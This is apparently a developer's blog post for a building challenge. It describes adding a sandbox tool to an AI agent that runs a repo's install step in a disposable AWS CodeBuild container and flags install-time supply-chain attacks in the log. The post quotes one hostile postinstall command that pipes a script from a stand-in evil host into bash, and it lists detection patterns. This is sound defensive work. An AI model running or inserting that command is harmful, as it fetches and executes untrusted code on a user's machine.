================================================================================
BUILDER CENTER SUBMISSION FIELDS  (copy each into the matching form field)
================================================================================

TITLE (<=255, keyword front-loaded):
I gave my AI agent one new tool: a disposable AWS sandbox that actually runs the repo

DESCRIPTION (<=512, not a title repeat):
My agent used to judge a GitHub repo by reading it. I added one tool, run_in_sandbox, and now it runs the install inside a disposable AWS CodeBuild container and reports the real result, catching the postinstall hook a static scan never sees. Here is the before and after, the code, and a live demo.

TAGS:
aws, ai-agents, security, codebuild

COVER IMAGE: docs/banner.png  (1200x675, minimal text)

================================================================================
BODY  (paste below this line)
================================================================================

My agent could read a GitHub repo and tell you if it looked safe. That word, looked, was the problem. So I gave it one new tool, and it stopped guessing.

The challenge this weekend was simple: take an agent you already built, add one new tool it did not have, and show the before and after. I had RepoPilot, a Strands agent on Amazon Bedrock that inspects a public repo and tells you whether it is safe to clone and run. Every tool it had read the repo from the outside. The README, the manifests, the file tree. Useful, but it is a book report. The dangerous part of a repo is not what you read. It is what runs the moment you type `npm install`.

So the one tool I added runs it. In a disposable AWS sandbox. And the difference is not subtle.

---

## The one `npm install` away from disaster

The scary moment with someone else's code is install time, not reading time. An npm `preinstall` or `postinstall` hook, a `pip` build step, a `Makefile` target: these execute automatically, with your shell's full environment, the second you install. By then the code already ran, with whatever your terminal can reach. Your AWS keys. Your SSH keys. Your session tokens.

This is a live problem, not a hypothetical. Through 2026 the npm registry kept getting hit with weaponized postinstall payloads inside trusted packages, and one security vendor counted roughly 19,500 malicious package versions in a single quarter. The developer-facing writeups have a blunt name for it: you are one `npm install` away from disaster.

Here is the part that bothered me. Almost every tool that claims to help does static analysis. It reads the code without running it and guesses. That is exactly blind to the thing that makes install-time attacks work, a hook that only shows its hand when it executes. A reader cannot see a `postinstall` fire. A runner can.

---

## Before: the agent reads the repo

RepoPilot v1 had five tools, and all five were readers. Point it at `pallets/click` and it would pull the README and the manifest, see they agree, and say "looks safe, try `pip install .`". Point it at a repo whose `package.json` quietly carried a `postinstall` that piped a remote script into a shell, and it would say the same thing: "looks fine." Not because it was careless. Because the hook is invisible to anything that only reads.

That is an honest verdict about the text. It is not an honest verdict about what happens when you run it.

---

## After: the agent runs the repo in a disposable AWS sandbox

The new tool is a single Strands `@tool` called `run_in_sandbox`. It does four things:

1. Clones the repo and runs its install command inside an ephemeral AWS CodeBuild container.
2. Captures the real build log from CloudWatch.
3. Reports whether the install actually succeeded, with a plain-language cause if it failed.
4. Scans that real log for supply-chain danger: a remote script piped into a shell, an `eval` of a download, a download-then-chmod-then-run, a destructive `sudo`.

The container is thrown away after the run. The untrusted code executes in AWS, never on your laptop. That is the whole safety argument in one sentence: it presses the button in a box, so you do not press it on your machine.

Now point it at that same sneaky repo. The agent runs the install, reads the real log, and comes back with something a scanner could never produce:

> Caught it. The install piped `curl -s https://evil.example.com/i.sh | bash` straight into a shell. That line is in the real build log.

Same agent. Same repo. One new tool. v1 is a confident guess. v2 is the truth, with the evidence quoted from a log of code that actually ran.

---

## How the tool works

The agent reasons with Amazon Nova Pro on Bedrock through the Strands SDK. The tool itself is boring in the best way, which is what makes it reusable:

- `build_buildspec` writes the clone and install steps into a base64-encoded shell script embedded in the CodeBuild buildspec. I did that after a real run failed: a repo's install command had quotes in it and broke the YAML. Base64 makes any quoting safe. The tests now cover exactly that case.
- `CodeBuildSandbox.run` calls `StartBuild`, polls until the build finishes, then pulls the log from CloudWatch.
- `scan_log_for_danger` matches the real executed log for the high-signal classes of install-time attack and returns each one with a plain-English reason and the exact evidence line.
- `summarize_build` turns all of that into a small JSON result any agent framework can consume.
- If AWS is not configured, the tool returns an "unavailable" result and the agent falls back to its static tools, so it never dead-ends.

One CodeBuild project serves every repo. The buildspec is overridden per run. The service role is least-privilege: it can write CloudWatch Logs and nothing else, because the clone and install need no AWS permissions.

---

## Why this is reusable, not a one-off

The point of the challenge is a tool other builders can lift. `run_in_sandbox` is a drop-in Strands `@tool` with one environment variable and one setup script. Any agent that has to answer "is it safe to actually run this untrusted thing?" can use the same pattern: run it in a disposable CodeBuild container, read the real log, decide from evidence instead of appearance.

Three deliberate choices make it genuinely portable. One AWS service and one env var, so setup is a single script that also creates the least-privilege role. An injectable AWS client, so the verdict logic is unit-tested with a fake CodeBuild and CloudWatch, no AWS needed, which is how nine tests run green offline. And a clean JSON result object, so the framework around it does not matter.

---

## Proof, and an honest take

Both paths were validated end to end against live AWS CodeBuild. The safe repo came back SUCCEEDED with no danger. The sneaky repo came back SUCCEEDED too, and the danger scan flagged `remote_pipe_to_shell` with the exact `curl | bash` line pulled from the real log. That second run is the entire thesis in one result: the sandbox executed the install, and the danger showed up where a README scan would never have looked.

I will be honest about the edges. The sandbox runs the install step, where install-time attacks fire and where most first-run failures happen, not the whole application. That scope is on purpose: fast and safe. The danger scan is pattern-based over the log, so it catches the common, high-value classes, not every possible obfuscation. And CodeBuild has outbound network by default because installs need it; a stricter build would pin egress to an allow-list. Noted, not done in a weekend.

None of that changes the core result. Running the code and reading the real log is a categorically better signal than reading a README and hoping.

---

## Try it

- Code, tests, and the setup and teardown scripts are in the repo.
- The live demo is the real RepoPilot UI with the tool built in: inspect a repo (try the safe `pallets/click` and the sneaky `evil/fake-agent-kit`), then hit "Run it in a disposable AWS sandbox" and watch the agent go from "looks fine" to "caught it." It is a static replay of real recorded runs, so it costs nothing to keep online.

Everyone scans the repo. RepoPilot runs it, in a disposable AWS box, so your laptop does not.

Live demo: https://simplynadaf.github.io/repopilot-sandbox-tool/
Code: https://github.com/simplynadaf/repopilot-sandbox-tool
